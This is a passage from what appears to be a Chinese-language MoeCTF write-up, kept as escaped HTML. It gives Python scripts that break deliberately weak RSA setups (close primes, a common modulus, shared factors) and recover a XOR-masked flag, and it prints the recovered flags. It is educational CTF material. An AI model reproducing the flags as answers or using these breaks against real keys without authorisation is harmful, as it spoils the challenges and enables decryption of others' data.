&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    18390046459144888243,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    16123604149048919099,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    10596280721192026229,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    10547615587767500213,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    17673334943789572513,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    12448177342966243757,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    17265001711647542137,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    16408421615173973083,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    10864078180916418691,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    15751974537676958401,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    14813953870710226847
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi_n2 = 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi_n1 = (p1 - 1) * (q1 - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for prime in factors:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    phi_n2 *= (prime - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d1 = gmpy2.invert(e, phi_n1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d2 = gmpy2.invert(e, phi_n2)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m1 = pow(c1, d1, n1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m2 = pow(c2, d2, n2)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;#39;{long_to_bytes(m1).decode()}{long_to_bytes(m2).decode()}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{fACtord6_And_YAfu_Are_6oth_good_utils_to_fACtorize_num6ers_ff90S}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;p-q&quot;&gt;|p-q|&lt;a class=&quot;zola-anchor&quot; href=&quot;#p-q&quot; aria-label=&quot;Anchor link for: p-q&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from gmpy2 import gmpy2, invert
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = 329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;temp = gmpy2.iroot(n, 2)[0]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;p = gmpy2.next_prime(temp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;q = n &#x2F;&#x2F; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = 307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi = (p - 1) * (q - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = invert(e, phi)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = pow(c, d, n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(m).decode())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;n-n&quot;&gt;n&amp;amp;n&lt;a class=&quot;zola-anchor&quot; href=&quot;#n-n&quot; aria-label=&quot;Anchor link for: n-n&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from gmpy2 import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e1 = 0x114514
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e2 = 19198101
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = 13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c1 = 5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c2 = 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;s = gcdext(e1, e2)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = pow(c1, s[1], n) * pow(c2, s[2], n) % n
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(m).decode())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{dO_nOt_u53_5AM3_MOdulu5_tO_3ncrYPt_dIFF3r3nt_dAtA!_JY63x33iiA0Ji}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;rsa-signin&quot;&gt;rsa_signin&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa-signin&quot; aria-label=&quot;Anchor link for: rsa-signin&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from gmpy2 import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def find_common_factors(n_values):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    common_factors = {}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(len(n_values)):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        for j in range(i + 1, len(n_values)):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            gcd_value = gcd(n_values[i], n_values[j])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if gcd_value &amp;gt; 1:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                common_factors[(i, j)] = gcd_value
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return common_factors
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000263767190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795711511579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008486655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;common_factors = find_common_factors(n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;p = list(common_factors.values())[0]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;q = n[2] &#x2F;&#x2F; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi = (p - 1) * (q - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = invert(e, phi)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c_2 = 415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(pow(c_2, d, n[2])).decode())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{it_is_re@lly_@_signin_level_cryPto_ch@ll@nge_ng92WPIBung92WPIBun}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;xorrrrrrrrr&quot;&gt;xorrrrrrrrr&lt;a class=&quot;zola-anchor&quot; href=&quot;#xorrrrrrrrr&quot; aria-label=&quot;Anchor link for: xorrrrrrrrr&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag = open(&amp;#39;flag.txt&amp;#39;,&amp;#39;rb&amp;#39;).read()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;assert flag.startswith(b&amp;#39;moectf{&amp;#39;) and flag.endswith(b&amp;#39;}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;article = open(&amp;#39;article.txt&amp;#39;,&amp;#39;rb&amp;#39;).read()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import random
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;strxor = lambda x,y: bytes([a^b for a,b in zip(x,y)])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;result = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in range(100):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    range_start = random.randint(0, len(article) - len(flag))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    mask = article[range_start:range_start + len(flag)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    result.append(strxor(flag,mask))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;with open(&amp;quot;result.log&amp;quot;,&amp;quot;w&amp;quot;) as fs:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    fs.writelines([str(i)+&amp;quot;\n&amp;quot; for i in result])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;result.log&lt;&#x2F;code&gt; 的内容是通过从 &lt;code&gt;article.txt&lt;&#x2F;code&gt; 随机裁取 flag 长度的内容与 flag 进行异或的结果，一共循环 100 次也就是有 100 条异或结果。通过断言可以得到 flag 的前七个字节为 &lt;code&gt;moectf{&lt;&#x2F;code&gt; ，最后一个字节为 &lt;code&gt;}&lt;&#x2F;code&gt; 。因此通过将 &lt;code&gt;result.log&lt;&#x2F;code&gt; 每条的前七个字节与 &lt;code&gt;moectf{&lt;&#x2F;code&gt; 进行异或就可以获得 &lt;code&gt;article.txt&lt;&#x2F;code&gt; 中的 7 个字节，具体代码如下所示。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;with open(&amp;#39;.&#x2F;moectf&#x2F;result.log&amp;#39;, &amp;#39;r&amp;#39;) as f:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    results = [eval(line.strip()) for line in f.readlines()]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;keys = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;strxor = lambda x, y: bytes([a ^ b for a, b in zip(x, y)])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for result in results:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    keys.append(strxor(result[:7], &amp;quot;moectf{&amp;quot;.encode()))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# keys = [b&amp;#39;mers wh&amp;#39;, b&amp;#39;ractica&amp;#39;, b&amp;#39;flow vu&amp;#39;, b&amp;#39;citing &amp;#39;, b&amp;#39;are com&amp;#39;, b&amp;#39;rs. You&amp;#39;, ...]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;由于 100 次循环中，每次裁取得地方不同，部分会包含 keys 得内容，那么我们就可以通过这个进行爆破 flag 得中间部分。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;count = {}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def is_printable(a_result):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    printable = lambda s: s in string.printable.replace(&amp;quot;\t&amp;quot;, &amp;quot;&amp;quot;).replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;).replace(&amp;quot;\x0b&amp;quot;, &amp;quot;&amp;quot;).replace(&amp;quot;\x0c&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                                                                                                                &amp;quot;&amp;quot;).replace(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;\r&amp;quot;, &amp;quot;&amp;quot;).replace(&amp;quot; &amp;quot;, &amp;quot;&amp;quot;).encode()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return all([printable(c) for c in a_result])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;index = {}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def all_possiable(result, key):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(72 - 7):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        r = strxor(result[i + 7:i + 7 + 7], key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if is_printable(r):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if r in count:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                count[r] = count[r] + 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                count[r] = 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            index[r] = i
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for result in results:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for key in keys:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        all_possiable(result, key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in sorted(count.items(), key=lambda kv: (kv[1], kv[0]))[::-1][:1000]:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if len(i[0]) == 7:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(i, index[i[0]])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 &lt;code&gt;is_printable()&lt;&#x2F;code&gt; 可以判断该字节是否为可打印字符，通过 &lt;code&gt;all_possiable()&lt;&#x2F;code&gt; 函数不断从每条得第八个字节开始进行每七个字节每七个字节得读取与 keys 中的内容进行异或处理，并且计算每个输出的个数判断频率。最后通过 &lt;code&gt;sorted()&lt;&#x2F;code&gt; 函数进行筛选并输出前 1000 个（如果不筛选的话有 27w 条），根据输出的内容进行拼接就可以得到 flag 了。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;red_tHe&amp;#39;, 20) 18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_y0U_Ha&amp;#39;, 20) 3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_tHe_x0&amp;#39;, 20) 21
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;He_x0r_&amp;#39;, 20) 23
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;0Peart0&amp;#39;, 20) 30
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;ered_tH&amp;#39;, 19) 17
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;ed_tHe_&amp;#39;, 19) 19
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;_x0r_0P&amp;#39;, 19) 25
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;U_HaVe_&amp;#39;, 19) 6
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;0r_0Pea&amp;#39;, 19) 27
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;tHe_x0r&amp;#39;, 18) 22
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;JoxiMl}&amp;#39;, 18) 58
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;d_tHe_x&amp;#39;, 17) 20
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;3rux9G9&amp;#39;, 16) 48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;0W_y0U_&amp;#39;, 16) 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;astered&amp;#39;, 15) 14
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;YlJf!M3&amp;#39;, 15) 42
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;0iYlJf!&amp;#39;, 15) 40
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;x0r_0Pe&amp;#39;, 14) 26
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(b&amp;#39;rt0r!_0&amp;#39;, 14) 34
